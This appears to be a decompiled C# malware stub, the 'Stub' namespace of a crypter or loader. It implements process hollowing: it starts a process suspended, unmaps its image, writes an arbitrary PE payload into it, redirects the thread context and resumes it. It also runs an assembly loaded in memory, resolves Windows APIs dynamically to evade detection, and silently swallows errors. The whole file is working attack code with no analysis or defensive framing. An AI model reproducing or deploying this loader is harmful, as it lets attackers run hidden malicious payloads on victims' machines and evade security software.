using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace Stub
{
	// Token: 0x0200002B RID: 43
	[StandardModule]
	public sealed class Class9
	{
		// Token: 0x06000074 RID: 116 RVA: 0x00005104 File Offset: 0x00003304
		public static void smethod_0(byte[] byte_0)
		{
			try
			{
				Thread thread = new Thread(new ParameterizedThreadStart(Class9.smethod_1));
				thread.SetApartmentState(ApartmentState.STA);
				thread.Start(byte_0);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000075 RID: 117 RVA: 0x00005150 File Offset: 0x00003350
		public static void smethod_1(object object_0)
		{
			try
			{
				MethodInfo entryPoint = Assembly.Load((byte[])object_0).EntryPoint;
				if (entryPoint.GetParameters().Length == 1)
				{
					entryPoint.Invoke(null, new object[]
					{
						new string[0]
					});
				}
				else
				{
					entryPoint.Invoke(null, null);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000076 RID: 118 RVA: 0x000051BC File Offset: 0x000033BC
		public static int smethod_2(string String_0, string String_1, byte[] byte_0, bool bool_0, bool bool_1, string String_2 = "", int int_0 = 0)
		{
			try
			{
				int num = 1;
				while (!Class9.smethod_4(String_0, String_1, byte_0, bool_0, bool_1, String_2, int_0))
				{
					num++;
					if (num > 10)
					{
						return 0;
					}
				}
				return -1;
			}
			catch (Exception ex)
			{
			}
			return 0;
		}

		// Token: 0x06000077 RID: 119
		[DllImport("kernel32", SetLastError = true)]
		public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string String_0);

		// Token: 0x06000078 RID: 120
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern IntPtr GetProcAddress(IntPtr intptr_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string String_0);

		// Token: 0x06000079 RID: 121 RVA: 0x000021A7 File Offset: 0x000003A7
		public static T smethod_3<T>(string String_0, string String_1)
		{
			return Conversions.ToGenericParameter<T>(Marshal.GetDelegateForFunctionPointer(Class9.GetProcAddress(Class9.LoadLibraryA(ref String_0), ref String_1), typeof(T)));
		}

		// Token: 0x0600007A RID: 122 RVA: 0x0000520C File Offset: 0x0000340C
		public static bool smethod_4(string String_0, string String_1, byte[] byte_0, bool bool_0, bool bool_1 = false, string String_2 = "", int int_0 = 0)
		{
			string text = "\"" + String_0 + "\"";
			Class9.Struct4 @struct = default(Class9.Struct4);
			Class9.Struct3 struct2 = default(Class9.Struct3);
			@struct.int_0 = Marshal.SizeOf(typeof(Class9.Struct4));
			if (String_2.Length > 0)
			{
				@struct.String_1 = String_2;
			}
			if (bool_1)
			{
				@struct.short_0 = 0;
				@struct.int_8 = 1;
			}
			try
			{
				if (!string.IsNullOrEmpty(String_1))
				{
					text = text + " " + String_1;
				}
				IntPtr intPtr = 0;
				if (!Class9.delegate9_0(String_0, text, intPtr, intPtr, false, 4U, IntPtr.Zero, null, ref @struct, ref struct2))
				{
					throw new Exception();
				}
				int num = BitConverter.ToInt32(byte_0, 60);
				int num2 = BitConverter.ToInt32(byte_0, num + 52);
				int[] array = new int[179];
				array[0] = 65538;
				if (IntPtr.Size == 4)
				{
					if (!Class9.delegate4_0(struct2.intptr_1, array))
					{
						throw new Exception();
					}
				}
				else if (!Class9.delegate3_0(struct2.intptr_1, array))
				{
					throw new Exception();
				}
				int num3 = array[41];
				int num4 = 0;
				int num5 = 0;
				if (!Class9.delegate7_0(struct2.intptr_0, num3 + 8, ref num4, 4, ref num5))
				{
					throw new Exception();
				}
				if (num2 == num4 && Class9.delegate8_0(struct2.intptr_0, num4) != 0)
				{
					throw new Exception();
				}
				int length = BitConverter.ToInt32(byte_0, num + 80);
				int bufferSize = BitConverter.ToInt32(byte_0, num + 84);
				int num6 = Class9.delegate5_0(struct2.intptr_0, num2, length, 12288, 64);
				bool flag = false;
				if (!bool_0 && num6 == 0)
				{
					flag = true;
					num6 = Class9.delegate5_0(struct2.intptr_0, 0, length, 12288, 64);
				}
				if (num6 == 0)
				{
					throw new Exception();
				}
				if (!Class9.delegate6_0(struct2.intptr_0, num6, byte_0, bufferSize, ref num5))
				{
					throw new Exception();
				}
				int num7 = num + 248;
				int num8 = (int)(BitConverter.ToInt16(byte_0, num + 6) - 1);
				for (int i = 0; i <= num8; i++)
				{
					int num9 = BitConverter.ToInt32(byte_0, num7 + 12);
					int num10 = BitConverter.ToInt32(byte_0, num7 + 16);
					int srcOffset = BitConverter.ToInt32(byte_0, num7 + 20);
					if (num10 != 0)
					{
						byte[] array2 = new byte[num10 - 1 + 1];
						Buffer.BlockCopy(byte_0, srcOffset, array2, 0, array2.Length);
						if (!Class9.delegate6_0(struct2.intptr_0, num6 + num9, array2, array2.Length, ref num5))
						{
							throw new Exception();
						}
					}
					num7 += 40;
				}
				byte[] bytes = BitConverter.GetBytes(num6);
				if (!Class9.delegate6_0(struct2.intptr_0, num3 + 8, bytes, 4, ref num5))
				{
					throw new Exception();
				}
				int num11 = BitConverter.ToInt32(byte_0, num + 40);
				if (flag)
				{
					num6 = num2;
				}
				array[44] = num6 + num11;
				if (IntPtr.Size == 4)
				{
					if (!Class9.delegate2_0(struct2.intptr_1, array))
					{
						throw new Exception();
					}
				}
				else if (!Class9.delegate1_0(struct2.intptr_1, array))
				{
					throw new Exception();
				}
				if (Class9.delegate0_0(struct2.intptr_1) == -1)
				{
					throw new Exception();
				}
				int_0 = (int)struct2.uint_0;
			}
			catch (Exception ex)
			{
				Process processById = Process.GetProcessById((int)struct2.uint_0);
				if (processById != null)
				{
					processById.Kill();
				}
				return false;
			}
			return true;
		}

		// Token: 0x0400003E RID: 62
		public static readonly Class9.Delegate0 delegate0_0 = Class9.smethod_3<Class9.Delegate0>("kernel32", "ResumeThread");

		// Token: 0x0400003F RID: 63
		public static readonly Class9.Delegate1 delegate1_0 = Class9.smethod_3<Class9.Delegate1>("kernel32", "Wow64SetThreadContext");

		// Token: 0x04000040 RID: 64
		public static readonly Class9.Delegate2 delegate2_0 = Class9.smethod_3<Class9.Delegate2>("kernel32", "SetThreadContext");

		// Token: 0x04000041 RID: 65
		public static readonly Class9.Delegate3 delegate3_0 = Class9.smethod_3<Class9.Delegate3>("kernel32", "Wow64GetThreadContext");

		// Token: 0x04000042 RID: 66
		public static readonly Class9.Delegate4 delegate4_0 = Class9.smethod_3<Class9.Delegate4>("kernel32", "GetThreadContext");

		// Token: 0x04000043 RID: 67
		public static readonly Class9.Delegate5 delegate5_0 = Class9.smethod_3<Class9.Delegate5>("kernel32", "VirtualAllocEx");

		// Token: 0x04000044 RID: 68
		public static readonly Class9.Delegate6 delegate6_0 = Class9.smethod_3<Class9.Delegate6>("kernel32", "WriteProcessMemory");

		// Token: 0x04000045 RID: 69
		public static readonly Class9.Delegate7 delegate7_0 = Class9.smethod_3<Class9.Delegate7>("kernel32", "ReadProcessMemory");

		// Token: 0x04000046 RID: 70
		public static readonly Class9.Delegate8 delegate8_0 = Class9.smethod_3<Class9.Delegate8>("ntdll", "ZwUnmapViewOfSection");

		// Token: 0x04000047 RID: 71
		public static readonly Class9.Delegate9 delegate9_0 = Class9.smethod_3<Class9.Delegate9>("kernel32", "CreateProcessA");

		// Token: 0x0200002C RID: 44
		// (Invoke) Token: 0x0600007E RID: 126
		public delegate int Delegate0(IntPtr handle);

		// Token: 0x0200002D RID: 45
		// (Invoke) Token: 0x06000082 RID: 130
		public delegate bool Delegate1(IntPtr thread, int[] context);

		// Token: 0x0200002E RID: 46
		// (Invoke) Token: 0x06000086 RID: 134
		public delegate bool Delegate2(IntPtr thread, int[] context);

		// Token: 0x0200002F RID: 47
		// (Invoke) Token: 0x0600008A RID: 138
		public delegate bool Delegate3(IntPtr thread, int[] context);

		// Token: 0x02000030 RID: 48
		// (Invoke) Token: 0x0600008E RID: 142
		public delegate bool Delegate4(IntPtr thread, int[] context);

		// Token: 0x02000031 RID: 49
		// (Invoke) Token: 0x06000092 RID: 146
		public delegate int Delegate5(IntPtr handle, int address, int length, int type, int protect);

		// Token: 0x02000032 RID: 50
		// (Invoke) Token: 0x06000096 RID: 150
		public delegate bool Delegate6(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);

		// Token: 0x02000033 RID: 51
		// (Invoke) Token: 0x0600009A RID: 154
		public delegate bool Delegate7(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);

		// Token: 0x02000034 RID: 52
		// (Invoke) Token: 0x0600009E RID: 158
		public delegate int Delegate8(IntPtr process, int baseAddress);

		// Token: 0x02000035 RID: 53
		// (Invoke) Token: 0x060000A2 RID: 162
		public delegate bool Delegate9(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref Class9.Struct4 startupInfo, ref Class9.Struct3 processInformation);

		// Token: 0x02000036 RID: 54
		[StructLayout(LayoutKind.Sequential, Pack = 1)]
		public struct Struct3
		{
			// Token: 0x04000048 RID: 72
			public IntPtr intptr_0;

			// Token: 0x04000049 RID: 73
			public IntPtr intptr_1;

			// Token: 0x0400004A RID: 74
			public uint uint_0;

			// Token: 0x0400004B RID: 75
			public uint uint_1;
		}

		// Token: 0x02000037 RID: 55
		public struct Struct4
		{
			// Token: 0x0400004C RID: 76
			public int int_0;

			// Token: 0x0400004D RID: 77
			public string String_0;

			// Token: 0x0400004E RID: 78
			public string String_1;

			// Token: 0x0400004F RID: 79
			public string String_2;

			// Token: 0x04000050 RID: 80
			public int int_1;

			// Token: 0x04000051 RID: 81
			public int int_2;

			// Token: 0x04000052 RID: 82
			public int int_3;

			// Token: 0x04000053 RID: 83
			public int int_4;

			// Token: 0x04000054 RID: 84
			public int int_5;

			// Token: 0x04000055 RID: 85
			public int int_6;

			// Token: 0x04000056 RID: 86
			public int int_7;

			// Token: 0x04000057 RID: 87
			public int int_8;

			// Token: 0x04000058 RID: 88
			public short short_0;

			// Token: 0x04000059 RID: 89
			public short short_1;

			// Token: 0x0400005A RID: 90
			public int int_9;

			// Token: 0x0400005B RID: 91
			public int int_10;

			// Token: 0x0400005C RID: 92
			public int int_11;

			// Token: 0x0400005D RID: 93
			public int int_12;
		}
	}
}
